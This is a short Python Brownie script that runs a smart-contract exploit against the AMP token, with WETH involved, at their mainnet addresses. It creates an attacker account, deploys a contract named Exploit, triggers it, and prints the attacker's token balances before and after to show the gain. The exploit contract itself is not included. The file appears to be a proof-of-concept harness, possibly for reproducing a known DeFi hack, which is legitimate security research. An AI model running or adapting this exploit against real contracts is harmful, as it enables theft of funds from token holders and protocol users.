from brownie import *
from contextlib import redirect_stdout

# run the exploit

def main():
    amp = Contract("0xfF20817765cB7f73d4bde2e66e067E58D11095C2")
    weth = Contract("0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2")
    with redirect_stdout(None):
        attacker = accounts.add()

    print("==================== Deploying exploit contract: ====================")
    exploit = Exploit.deploy({'from': attacker})

    print("==================== Attacker balances before: ====================")
    print(f"AMP: {amp.balanceOf(attacker).to('ether'):.2f}")
    print(f"WETH: {weth.balanceOf(attacker).to('ether'):.2f}")

    print("==================== Starting exploit: ====================")
    exploit.start()

    print("==================== Attacker balances after: ====================")
    print(f"AMP: {amp.balanceOf(attacker).to('ether'):.2f}")
    print(f"WETH: {weth.balanceOf(attacker).to('ether'):.2f}")

